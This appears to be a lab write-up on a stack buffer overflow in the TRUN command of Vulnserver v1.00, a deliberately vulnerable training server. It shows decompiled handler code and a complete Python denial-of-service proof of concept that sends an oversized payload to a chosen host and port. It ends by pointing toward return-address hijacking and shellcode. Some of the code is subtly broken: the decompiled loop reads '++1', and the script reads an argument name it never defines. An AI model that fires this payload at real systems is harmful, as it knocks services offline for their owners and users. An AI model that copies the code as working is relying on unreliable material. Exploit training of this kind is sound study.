---
title: Exploit Development - Vulnserver v1.00 Part 1
published: 2025-10-22
description: DoS exploit development against Vulnserver v1.00
tags: [binary exploitation, medium, picoCTF 2025]
category: CTF Writeup
draft: false
lang: en
---

# Vulnserver v1.00 DoS Exploit Dev

## YouTube
<iframe width="560" height="315" src="https://www.youtube.com/embed/Dd5HpNzpu6w?si=ziFH6kOkVx-yjs3p" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

## Vulnerability
Vulnserver v1.00 has the following commands:

1.  HELP
2.  STATS [stat\_value]
3.  RTIME [rtime\_value]
4.  LTIME [ltime\_value]
5.  SRUN [srun\_value]
6.  TRUN [trun\_value]
7.  GMON [gmon\_value]
8.  GDOG [gdog\_value]
9.  KSTET [kstet\_value]
10. GTER [gter\_value]
11. HTER [hter\_value]
12. LTER [lter\_value]
13. KSTAN [lstan\_value]
14. EXIT

-----

The code that controls **TRUN** is as follows:

```c
else if ( !strncmp(buf, "TRUN ", 5u) )
{
	Destination = (char *)malloc(3000u);
	memset(Destination, 0, 3000u);
	for ( i = 5; i < len; ++1 )
	{
		if ( buf[i] == 46 )
		{
			strncpy(Destination, buf, 3000u);
			Function3(Destination);
			break;
		}
	}
	memset(Destination, 0, 0xBB8u);
	v17 = send(s, "TRUN COMPELTE\n", 14, 0);
}

char *__cdecl Function3(char *Source)
{
	char Destination[2008];

	return strcpy(Destination, Source);
}
```

Here, if the **6th value** of the string following the **TRUN** command matches **46** (ASCII text (46): `.`), `Function3` is called from `essfunc.dll`. This function creates a buffer that can store a string of **2008 bytes** but then saves **3000 bytes** into it. This is a very dangerous vulnerability that can allow a **Buffer OverFlow (BOF)** attack.

## PoC
```python
from argparse import ArgumentParser
from socket import *

def createPayload():
    data = b"A" * 65535

    payload = b"TRUN \x2E"
    payload += data

    return payload

def exploit(ip: str, port: int):
    print("[~] Generating payload...")
    payload = createPayload()
    print("[+] Payload generated")

    s = socket(AF_INET, SOCK_STREAM)
    print(f"[~] Connecting to the target: [{ip}]:{port}")
    s.connect((ip, port))

    print("[~] Waiting for a connection message...")
    conn_msg = s.recv(65535)
    print(f"[+] A connection message received: {conn_msg.decode()}")

    print("[~] Sending the payload...")
    s.send(payload)
    s.close()
    print("[+] Connection closed")

    print("[+] DoS Exploit Completed")

def main():
    parser = ArgumentParser(
        prog="Vulnserver v1.00 Exploit",
        description="TRUN command BOF DoS Vulnerability"
    )
    parser.add_argument(
        "-t", "--target",
        type=str,
        help="Set target IPv4 address",
        required=True
    )
    parser.add_argument(
        "-p", "--port",
        type=int,
        help="Set target port number",
        required=True
    )
    
    args = parser.parse_args()

    target_ip       = str(args.ip)
    target_port     = int(args.port)

    exploit(target_ip, target_port)

if __name__ == "__main__":
    main()
```

The Proof of Concept (PoC) above is code that **overwrites 65,535 bytes of memory** via a Buffer Overflow (BOF) attack.
The program terminates abnormally with a DEP Violation error.
A DEP Violation error means that an error is returned due to **an attempted return to a non-executable memory location**.
This indicates that **it's possible to overwrite the return address in the program to perform a Control Flow Hijack,** which could ultimately lead to the execution of a remote attacker's shellcode.
In Part 2, we will develop an RCE Exploit involving a NOP Slide and shellcode generation.